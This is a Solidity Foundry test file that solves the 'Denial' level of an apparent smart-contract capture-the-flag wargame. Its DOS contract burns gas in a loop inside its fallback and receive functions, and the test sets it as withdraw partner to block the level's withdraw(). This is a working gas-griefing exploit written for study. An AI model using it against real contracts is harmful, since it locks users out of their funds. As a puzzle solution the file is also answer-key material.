// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import {LevelFactory} from "../utils/LevelFactory.sol";
import {Denial} from  "../../src/Denial/Level.sol";
import {Test} from "forge-std/Test.sol";

interface IDenial {
    function withdraw() external;

    function setWithdrawPartner(address) external;

    function owner() external;
}

contract DOS is Test {
    IDenial denial;

    uint waste;
    bool fallbacked;

    constructor(IDenial _denial) public {
	denial = _denial;
    }

    function withdraw() external {
	denial.withdraw();
    }

    fallback() external payable {
	if (!fallbacked) {
	    fallbacked = true;
	} else {
	    for(uint i; i < 1000000; i++) {
		waste = i;
	    }
	}
    }

    receive() external payable {
	if (!fallbacked) {
	    fallbacked = true;
	} else {
	    for(uint i; i < 1000000; i++) {
		waste = i;
	    }
	}
    }
}

contract DenialTest is LevelFactory {
    IDenial denial;

    function setUp() public {
	vm.startPrank(deployer);
	denial = IDenial(address(new Denial()));
	vm.deal(address(denial), 5 ether);
	vm.stopPrank();
    }

    function testAttack() public {
	submitLevel("Denial");
    }

    function _performTest() internal override {
	address dos = address(new DOS(denial));
	denial.setWithdrawPartner(dos);
	(bool status,) = dos.call(abi.encodeWithSignature("withdraw()"));
	status;
    }

    function _setupTest() internal override {
	super._setupTest();
    }

    function _checkTest() internal override returns (bool) {
	vm.stopPrank();
	vm.startPrank(address(0xA9E));
	uint beforeGas = gasleft();
	(bool status,) = address(denial).call(abi.encodeWithSignature("withdraw()"));
	status;
	uint afterGas = gasleft();
	assertLe(afterGas + 1000000, beforeGas);
	return afterGas + 1000000 < beforeGas ;
    }
}

